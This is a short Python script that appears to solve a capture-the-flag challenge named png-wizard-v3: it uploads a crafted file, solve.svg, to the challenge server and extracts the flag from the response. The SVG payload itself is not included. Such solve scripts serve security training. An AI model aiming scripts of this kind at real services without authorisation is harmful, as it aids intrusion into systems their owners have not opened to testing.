import re

import requests

## URL = "http://localhost:1337"
URL = "http://png-wizard-v3.hsctf.com/"
resp = requests.post(URL, files={"file": ("solve.svg", open("solve.svg"))})
print(re.search(r"flag{.*?}", resp.text).group(0))